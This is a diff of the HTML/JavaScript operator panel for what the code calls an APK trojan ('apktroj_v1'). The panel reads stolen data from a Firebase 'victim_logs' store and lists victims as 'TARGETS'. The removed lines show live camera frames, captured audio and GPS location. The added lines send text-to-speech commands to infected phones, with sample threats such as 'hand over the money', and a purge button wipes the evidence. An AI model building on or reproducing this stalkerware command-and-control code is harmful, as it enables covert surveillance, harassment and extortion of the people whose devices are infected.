@@ -3,139 +3,81 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>C.R Monitoring V1.3 - Ultra Smooth</title>
+    <title>C.R Monitoring V1.3 - Voice Intercom</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        body { background-color: #020202; color: #00ff41; font-family: 'Consolas', monospace; }
-        .neon-border { border: 1px solid #00ff41; box-shadow: 0 0 5px #00ff41; }
-        .neon-text { text-shadow: 0 0 5px #00ff41; }
-        .tab-btn { transition: 0.3s; border-bottom: 2px solid transparent; opacity: 0.6; }
-        .tab-btn.active { opacity: 1; border-color: #ff0000; color: #ff0000; text-shadow: 0 0 5px #ff0000; }
-        
-        /* Smooth Video Effect */
-        #stream-img { 
-            transition: opacity 0.15s ease-in-out;
-            filter: contrast(1.1) brightness(1.1);
-        }
-        
-        .live-tag {
-            background: #ff0000;
-            animation: pulse 1.5s infinite;
-        }
-        @keyframes pulse {
-            0% { opacity: 1; }
-            50% { opacity: 0.4; }
-            100% { opacity: 1; }
-        }
-
-        ::-webkit-scrollbar { width: 4px; }
-        ::-webkit-scrollbar-thumb { background: #00ff41; }
+        body { background-color: #050505; color: #00ff00; font-family: 'Courier New', Courier, monospace; }
+        .glitch-border { border: 1px solid #00ff00; box-shadow: 0 0 10px #00ff00; }
+        .victim-card { background: #111; border: 1px solid #222; border-radius: 8px; transition: 0.3s; }
+        .victim-card:hover { border-color: #ff0000; }
+        .tab-btn { padding: 10px; border-bottom: 2px solid transparent; cursor: pointer; }
+        .tab-btn.active { border-color: #ff0000; color: #ff0000; }
+        .live-indicator { animation: blink 1s infinite; color: red; font-weight: bold; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
+        .mic-btn { background: #1a1a1a; border: 1px solid #00ff00; transition: 0.3s; }
+        .mic-btn:active { background: #00ff00; color: #000; scale: 0.95; }
     </style>
 </head>
-<body class="p-2 md:p-6">
-    <div class="max-w-7xl mx-auto">
-        <header class="flex flex-col md:flex-row justify-between items-start md:items-center border-b border-green-900 pb-4 mb-6">
+<body class="p-4">
+    <div class="max-w-6xl mx-auto">
+        <header class="flex justify-between items-center border-b border-green-900 pb-4 mb-6">
             <div>
-                <h1 class="text-3xl font-black tracking-tighter neon-text uppercase">C.R V1.3 <span class="text-red-600">ULTRA-SMOOTH</span></h1>
-                <p class="text-[10px] text-gray-500 italic">Target monitoring & real-time surveillance | User: gigs</p>
+                <h1 class="text-3xl font-bold uppercase tracking-widest text-red-600">C.R COMMAND CENTER V1.3</h1>
+                <p class="text-xs text-gray-500">OWNER: GIGS | PERMANENT_SYSTEM ACTIVE</p>
             </div>
-            <div class="flex items-center gap-4 mt-4 md:mt-0">
-                <div id="connection-status" class="text-[10px] px-2 py-1 border border-green-800 rounded">
-                    SYS: <span class="text-yellow-500">INITIATING...</span>
-                </div>
-                <button id="purge-all" class="bg-red-900 hover:bg-red-600 text-white text-[10px] px-4 py-2 font-bold rounded uppercase transition-all">Bersihkan Data</button>
+            <div class="text-right">
+                <button id="purge-all" class="text-xs border border-red-600 text-red-600 px-3 py-1 hover:bg-red-600 hover:text-white mb-2">PURGE ALL</button>
+                <div id="auth-info" class="text-[10px] text-gray-400">Connecting...</div>
             </div>
         </header>
 
-        <div class="grid grid-cols-1 lg:grid-cols-12 gap-6">
-            <!-- Left: Victim Sidebar -->
-            <div class="lg:col-span-3 border-r border-green-900 pr-4">
-                <h2 class="text-sm font-bold mb-4 flex items-center"><span class="mr-2">📂</span> DAFTAR TARGET</h2>
-                <div id="victim-list" class="space-y-2 overflow-y-auto max-h-[300px] lg:max-h-[600px]">
-                    <div class="text-gray-700 text-xs italic">Menunggu target masuk...</div>
-                </div>
+        <div class="grid grid-cols-1 lg:grid-cols-4 gap-6">
+            <div class="lg:col-span-1 border-r border-green-900 pr-4">
+                <h2 class="text-lg font-bold mb-4">TARGETS</h2>
+                <div id="victim-list" class="space-y-2"></div>
             </div>
 
-            <!-- Right: Display Area -->
-            <div class="lg:col-span-9">
-                <nav class="flex space-x-6 mb-6 border-b border-gray-900">
-                    <button class="tab-btn active pb-2 font-bold" id="tab-live">LIVE FEED</button>
-                    <button class="tab-btn pb-2 font-bold" id="tab-log">SISTEM LOGS</button>
-                    <button class="tab-btn pb-2 font-bold" id="tab-geo">LOKASI GPS</button>
-                </nav>
+            <div class="lg:col-span-3">
+                <div class="flex space-x-4 mb-4 border-b border-gray-800">
+                    <div class="tab-btn active" id="tab-intercom">INTERCOM & LIVE</div>
+                    <div class="tab-btn" id="tab-log">ACTIVITY LOGS</div>
+                </div>
 
-                <!-- Panel: Live Camera -->
-                <div id="content-live" class="grid grid-cols-1 xl:grid-cols-2 gap-6">
-                    <div class="space-y-4">
-                        <div class="relative bg-black rounded-lg overflow-hidden neon-border aspect-video flex items-center justify-center">
-                            <div class="absolute top-4 left-4 z-10 flex items-center">
-                                <span class="live-tag px-2 py-1 text-[10px] font-bold text-white rounded-sm mr-2">LIVE</span>
-                                <span id="target-id" class="text-xs bg-black bg-opacity-50 px-2 py-1 rounded">OFFLINE</span>
+                <!-- Intercom Panel -->
+                <div id="content-intercom" class="space-y-4">
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                        <div class="glitch-border p-4 bg-black">
+                            <h3 class="text-red-500 font-bold mb-2">LIVE FEED <span class="live-indicator ml-2">●</span></h3>
+                            <div class="aspect-video bg-gray-900 flex items-center justify-center border border-red-900">
+                                <img id="stream-img" class="w-full h-full object-contain hidden">
+                                <span id="stream-placeholder" class="text-gray-700">Waiting for target...</span>
                             </div>
-                            <img id="stream-img" src="" class="w-full h-full object-cover hidden">
-                            <div id="stream-placeholder" class="text-gray-800 flex flex-col items-center">
-                                <svg class="w-12 h-12 mb-2" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="1" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z"></path></svg>
-                                <span class="text-[10px]">MENUNGGU STREAM DATA...</span>
-                            </div>
-                            <div class="absolute bottom-4 right-4 text-[10px] text-white bg-black bg-opacity-50 px-2 py-1" id="stream-clock">--:--:--</div>
                         </div>
-                    </div>
-
-                    <div class="bg-[#0a0a0a] p-4 rounded-lg border border-gray-900 flex flex-col h-[300px] md:h-full">
-                        <h3 class="text-blue-500 text-xs font-bold mb-4 flex items-center">
-                            <span class="mr-2">🎙️</span> AUDIO MONITORING
-                        </h3>
-                        <div id="audio-container" class="space-y-3 overflow-y-auto flex-1 pr-2">
-                             <p class="text-gray-800 text-[10px] italic">Belum ada rekaman suara...</p>
+                        
+                        <div class="glitch-border p-4 bg-black flex flex-col justify-between">
+                            <div>
+                                <h3 class="text-blue-500 font-bold mb-2 text-center">VOICE TO TARGET</h3>
+                                <p class="text-[10px] text-gray-500 mb-4 text-center">Ketik pesan di bawah, target bakal denger suaranya.</p>
+                                <textarea id="voice-msg" class="w-full bg-gray-900 border border-blue-900 p-2 text-white text-sm outline-none h-24" placeholder="Contoh: 'Woi, gue liat lu!' atau 'Serahkan uangnya!'"></textarea>
+                                <button id="send-voice" class="w-full bg-blue-600 text-white font-bold py-2 mt-2 hover:bg-blue-700">SEND VOICE COMMAND</button>
+                            </div>
+                            <div class="mt-4 border-t border-gray-800 pt-2">
+                                <p class="text-xs text-yellow-500">Status: <span id="comm-status">Idle</span></p>
+                            </div>
                         </div>
                     </div>
                 </div>
 
-                <!-- Panel: Activity Logs -->
                 <div id="content-log" class="hidden">
-                    <div class="bg-[#050505] border border-green-900 p-4 rounded h-[500px] overflow-hidden flex flex-col">
-                        <div id="logs-container" class="flex-1 overflow-y-auto space-y-1 text-[10px]"></div>
-                    </div>
+                    <div id="logs-container" class="max-h-[60vh] overflow-y-auto text-xs space-y-1"></div>
                 </div>
-
-                <!-- Panel: Geolocation -->
-                <div id="content-geo" class="hidden">
-                    <div class="neon-border p-6 bg-black rounded-lg">
-                        <div class="flex items-center justify-between mb-6">
-                            <h3 class="text-yellow-500 font-bold">POSISI TERAKHIR TARGET</h3>
-                            <a id="map-link" href="#" target="_blank" class="bg-yellow-600 text-black px-4 py-2 rounded text-xs font-black">BUKA DI GOOGLE MAPS</a>
-                        </div>
-                        <div class="grid grid-cols-2 gap-4">
-                            <div class="p-4 bg-gray-900 rounded">
-                                <p class="text-gray-500 text-[10px]">LATITUDE</p>
-                                <p id="lat-val" class="text-xl font-bold">0.000000</p>
-                            </div>
-                            <div class="p-4 bg-gray-900 rounded">
-                                <p class="text-gray-500 text-[10px]">LONGITUDE</p>
-                                <p id="lng-val" class="text-xl font-bold">0.000000</p>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- Modal Purge -->
-    <div id="purge-modal" class="fixed inset-0 bg-black bg-opacity-95 z-50 hidden flex items-center justify-center p-4">
-        <div class="border-2 border-red-600 p-8 bg-black max-w-sm w-full text-center">
-            <h2 class="text-red-600 text-3xl font-black mb-2">WARNING</h2>
-            <p class="text-white text-sm mb-8">Semua log, foto, dan audio akan dihapus selamanya. Lanjutkan?</p>
-            <div class="flex gap-4">
-                <button id="cancel-purge" class="flex-1 py-3 border border-gray-700 text-gray-500 font-bold">BATAL</button>
-                <button id="confirm-purge" class="flex-1 py-3 bg-red-600 text-white font-bold shadow-[0_0_20px_rgba(255,0,0,0.5)]">HAPUS TOTAL</button>
             </div>
         </div>
     </div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
-        import { getFirestore, collection, onSnapshot, getDocs, deleteDoc, doc, query, orderBy, limit } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
+        import { getFirestore, collection, onSnapshot, addDoc, getDocs, deleteDoc, doc } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
         import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
 
         const firebaseConfig = {
@@ -153,108 +95,72 @@
         const db = getFirestore(app);
         const auth = getAuth(app);
         const appId = "apktroj_v1";
+        const apiKey = ""; // API Key for Gemini TTS if needed, but we'll use simple field update
 
         onAuthStateChanged(auth, async (user) => {
             if (!user) await signInAnonymously(auth);
             else {
-                document.getElementById('connection-status').innerHTML = `CORE: <span class="text-green-500">READY</span>`;
-                initMonitoring();
+                document.getElementById('auth-info').innerText = "SYSTEM ACTIVE: " + user.uid;
+                initApp();
             }
         });
 
-        // Tab System
+        // Tab Logic
         document.querySelectorAll('.tab-btn').forEach(btn => {
             btn.addEventListener('click', () => {
                 document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
                 btn.classList.add('active');
-                const target = btn.id.replace('tab-', 'content-');
-                ['content-live', 'content-log', 'content-geo'].forEach(id => {
-                    document.getElementById(id).classList.toggle('hidden', id !== target);
-                });
+                document.getElementById('content-intercom').classList.toggle('hidden', btn.id !== 'tab-intercom');
+                document.getElementById('content-log').classList.toggle('hidden', btn.id !== 'tab-log');
             });
         });
 
-        // Purge Logic
-        document.getElementById('purge-all').onclick = () => document.getElementById('purge-modal').classList.remove('hidden');
-        document.getElementById('cancel-purge').onclick = () => document.getElementById('purge-modal').classList.add('hidden');
-        document.getElementById('confirm-purge').onclick = async () => {
-            const snap = await getDocs(collection(db, 'artifacts', appId, 'public', 'data', 'victim_logs'));
-            const batch = snap.docs.map(d => deleteDoc(doc(db, 'artifacts', appId, 'public', 'data', 'victim_logs', d.id)));
-            await Promise.all(batch);
-            location.reload();
-        };
-
-        function initMonitoring() {
+        async function initApp() {
             const logsRef = collection(db, 'artifacts', appId, 'public', 'data', 'victim_logs');
-            const processedIds = new Set();
-            
             onSnapshot(logsRef, (snap) => {
                 const streamImg = document.getElementById('stream-img');
-                const streamPlace = document.getElementById('stream-placeholder');
-                const logCont = document.getElementById('logs-container');
-                const vicCont = document.getElementById('victim-list');
-
-                if(snap.empty) return;
-
-                // Sort local for better experience
-                const docs = snap.docs.sort((a,b) => b.data().timestamp - a.data().timestamp);
+                const streamPlaceholder = document.getElementById('stream-placeholder');
                 
-                const victims = {};
-
-                docs.forEach(docSnap => {
+                snap.forEach(docSnap => {
                     const data = docSnap.data();
-                    const id = docSnap.id;
-
-                    // Victim List logic
-                    if(!victims[data.uid]) {
-                        victims[data.uid] = data;
-                        const vDiv = document.createElement('div');
-                        vDiv.className = "p-2 border border-gray-800 rounded text-[10px] hover:bg-green-950 cursor-pointer flex justify-between";
-                        vDiv.innerHTML = `<span>USER_${data.uid.substring(0,6)}</span><span class="text-green-500">●</span>`;
-                        vicCont.prepend(vDiv);
-                    }
-
-                    // Log Logic
-                    if(!processedIds.has(id)) {
-                        const lDiv = document.createElement('div');
-                        lDiv.className = "py-1 border-b border-gray-900";
-                        lDiv.innerHTML = `<span class="text-gray-600">[${new Date(data.timestamp).toLocaleTimeString()}]</span> <span class="text-blue-400">${data.action}</span> - <span class="text-white">${data.uid.substring(0,6)}</span>`;
-                        logCont.prepend(lDiv);
-                        processedIds.add(id);
-                    }
-
-                    // Live Stream Logic (Latest Frame)
                     if(data.action === "LIVE_FRAME") {
-                        if(streamImg.src !== data.frame) {
-                            streamImg.src = data.frame;
-                            streamImg.classList.remove('hidden');
-                            streamPlace.classList.add('hidden');
-                            document.getElementById('target-id').innerText = `TARGET: ${data.uid.substring(0,8)}`;
-                            document.getElementById('stream-clock').innerText = new Date(data.timestamp).toLocaleTimeString();
-                        }
+                        streamImg.src = data.frame;
+                        streamImg.classList.remove('hidden');
+                        streamPlaceholder.classList.add('hidden');
                     }
-
-                    // Audio Logic
-                    if(data.action === "AUDIO_CLIP" && !document.getElementById(`aud-${id}`)) {
-                        const aDiv = document.createElement('div');
-                        aDiv.id = `aud-${id}`;
-                        aDiv.className = "bg-black border border-blue-900 p-2 rounded";
-                        aDiv.innerHTML = `
-                            <p class="text-[9px] text-gray-500 mb-1">${new Date(data.timestamp).toLocaleString()}</p>
-                            <audio controls src="${data.audio}" class="w-full h-6"></audio>
-                        `;
-                        document.getElementById('audio-container').prepend(aDiv);
-                    }
-
-                    // Geo Logic
-                    if(data.location) {
-                        document.getElementById('lat-val').innerText = data.location.lat.toFixed(6);
-                        document.getElementById('lng-val').innerText = data.location.lng.toFixed(6);
-                        document.getElementById('map-link').href = `https://www.google.com/maps?q=${data.location.lat},${data.location.lng}`;
-                    }
+                    // Populate logs simple
+                    const log = document.createElement('div');
+                    log.innerText = `[${new Date(data.timestamp).toLocaleTimeString()}] ${data.action}`;
+                    document.getElementById('logs-container').prepend(log);
                 });
             });
         }
+
+        // Send Voice Command to Target
+        document.getElementById('send-voice').onclick = async () => {
+            const msg = document.getElementById('voice-msg').value;
+            if(!msg) return;
+            
+            document.getElementById('comm-status').innerText = "Sending...";
+            try {
+                await addDoc(collection(db, 'artifacts', appId, 'public', 'data', 'commands'), {
+                    type: "TTS_VOICE",
+                    text: msg,
+                    timestamp: Date.now()
+                });
+                document.getElementById('comm-status').innerText = "Sent Successfully!";
+                document.getElementById('voice-msg').value = "";
+                setTimeout(() => document.getElementById('comm-status').innerText = "Idle", 2000);
+            } catch (e) {
+                document.getElementById('comm-status').innerText = "Failed!";
+            }
+        };
+
+        document.getElementById('purge-all').onclick = async () => {
+            const snapshot = await getDocs(collection(db, 'artifacts', appId, 'public', 'data', 'victim_logs'));
+            snapshot.forEach(d => deleteDoc(doc(db, 'artifacts', appId, 'public', 'data', 'victim_logs', d.id)));
+            location.reload();
+        };
     </script>
 </body>
 </html>
